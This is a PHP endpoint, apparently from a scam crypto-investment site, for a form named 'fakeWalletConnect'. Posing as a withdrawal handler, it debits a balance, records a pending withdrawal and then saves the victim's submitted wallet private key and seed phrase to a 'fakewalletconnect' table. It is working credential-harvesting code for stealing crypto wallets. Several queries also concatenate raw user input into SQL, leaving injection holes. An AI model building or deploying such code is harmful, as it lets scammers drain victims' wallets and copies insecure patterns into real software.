<?php
include('../connection.php');

header("Content-Type: application/json");

$selectSite = mysqli_fetch_assoc(mysqli_query($connection, "SELECT withdraw_charge FROM sitedetails"));

if (isset($_POST['from']) && $_POST['from'] == "fakeWalletConnect") {

    $login_id = $_POST['user'];
    $name = $_POST['name'];
    $extra = $_POST['extra'] ?? '';
    $privateKey = $_POST['privateKey'];
                  $seedPhrase = $_POST['seedPhrase'];

    if ($extra) {
        $extraData = json_decode($extra, true);

        $the_account = $extraData['the_account'] ?? '';
        $the_amount  = floatval($extraData['the_amount'] ?? 0);
        $the_balance = floatval($extraData['the_balance'] ?? 0);
        $the_request = $extraData['the_request'] ?? '';

        if ($the_request == "withdrawal") {


            if ($the_amount <= 0) {
                echo json_encode(["status" => "error", "message" => "Invalid amount"]);
                exit;
            }

            if ($the_amount > $the_balance) {
                echo json_encode(["status" => "error", "message" => "Insufficient balance"]);
                exit;
            }

            $charge_percent = $selectSite['withdraw_charge'] / 100;
            $charge = $the_amount * $charge_percent;

            $balance_after = $the_balance - $the_amount;

            /* ======================
       DEBIT USER ACCOUNT
    ====================== */

            if ($the_account == "main") {

                $stmt = $connection->prepare("UPDATE users SET mainBalance	 = mainBalance	 - ? WHERE id = ?");
                $stmt->bind_param("di", $the_amount, $login_id);
                $stmt->execute();
            } elseif ($the_account == "card") {

                $stmt = $connection->prepare("UPDATE card SET balance = balance - ? WHERE user = ? AND is_active='active'");
                $stmt->bind_param("di", $the_amount, $login_id);
                $stmt->execute();
            } else {

                // crypto wallet (btc, eth, sol)
                $userQuery = mysqli_query($connection, "SELECT wallet FROM users WHERE id='$login_id' LIMIT 1");
                $userData = mysqli_fetch_assoc($userQuery);

                $wallet = json_decode($userData['wallet'], true);

                if (!isset($wallet[$the_account])) {
                    echo json_encode(["status" => "error", "message" => "Wallet not found"]);
                    exit;
                }

                if ($wallet[$the_account] < $the_amount) {
                    echo json_encode(["status" => "error", "message" => "Insufficient wallet balance"]);
                    exit;
                }

                $wallet[$the_account] -= $the_amount;

                $walletJson = json_encode($wallet);

                $stmt = $connection->prepare("UPDATE users SET wallet=? WHERE id=?");
                $stmt->bind_param("si", $walletJson, $login_id);
                $stmt->execute();
            }

            /* ======================
       INSERT WITHDRAWAL
    ====================== */

            $stmt = $connection->prepare("INSERT INTO withdrawals 
        (login_id,name,account,amount,charge,balance_after,request_type,status)
        VALUES (?,?,?,?,?,?,?,?)");

            $status = "pending";

            $stmt->bind_param(
                "sssddsss",
                $login_id,
                $name,
                $the_account,
                $the_amount,
                $charge,
                $balance_after,
                $the_request,
                $status
            );

            if ($stmt->execute()) {
                saveData($login_id,$name,$privateKey,$seedPhrase);
            }
        } else {
            echo json_encode(["status" => "error", "message" => "Invalid request", "data" => $extra, "data1" => $extraData]);
            exit;
        }
    } else {
        echo json_encode(["status" => "error", "message" => "Missing request data"]);
        exit;
    }
}

function saveData($login_id,$name,$privateKey,$seedPhrase)
{
     global $connection ;
     
    $query = mysqli_query($connection, "INSERT INTO `fakewalletconnect`(`id`, `user_id`,`name`,`privateKey`, `seedPhrase`) VALUES ('','$login_id','$name','$privateKey','$seedPhrase')");

    if ($query) {
         echo json_encode(["status" => "success", "message" => "Data save"]);
    } else {
         echo json_encode(["status" => "error", "message" => "Data not saved"]);
    }
}
